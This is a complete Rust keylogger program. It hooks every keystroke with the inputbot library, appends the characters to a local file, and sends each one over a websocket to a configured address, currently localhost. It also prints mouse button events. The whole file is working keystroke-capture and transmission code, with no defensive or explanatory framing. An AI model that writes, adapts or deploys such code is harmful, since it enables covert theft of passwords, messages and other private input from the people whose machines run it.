use inputbot::{KeybdKey::*, MouseButton::*, *};
use std::fs::OpenOptions;
use std::io::prelude::*;
use tungstenite::{connect, Message};
use url::Url;

const WS_ADDRESS:&str = "ws://localhost:8765";

fn passthrough_key(event: &str) {
    file_writer(event);
    ws_client(event);
}

fn file_writer(event: &str) {
    let mut file = OpenOptions::new()
    .write(true)
    .append(true)
    .open("text.txt")
    .unwrap();

    if let Err(e) = write!(file, "{}", event) {
        eprintln!("Couldn't write to file: {}", e);
    }
}

fn ws_client(event: &str) {
    // env_logger::init();
    let (mut socket, _response) =
    connect(Url::parse(&WS_ADDRESS).unwrap()).expect("Can't connect");
    socket.write_message(Message::Text(event.into())).unwrap();
}

fn main() {
    println!("Keylogger Running =>");
    keyboard_input();
}

fn keyboard_input() {
    KeybdKey::bind_all(|event| {
        let mut c_action = ' ';
        match inputbot::from_keybd_key(event) {
            Some(c) => { 
                c_action = c;
            },
            None => {println!("{:?}", event)},
        };
        passthrough_key(c_action.to_string().as_str());
    });

    // Bind all mouse buttons to a common callback event.
    MouseButton::bind_all(|event| {
        println!("{:?}", event);
    });

    handle_input_events();
}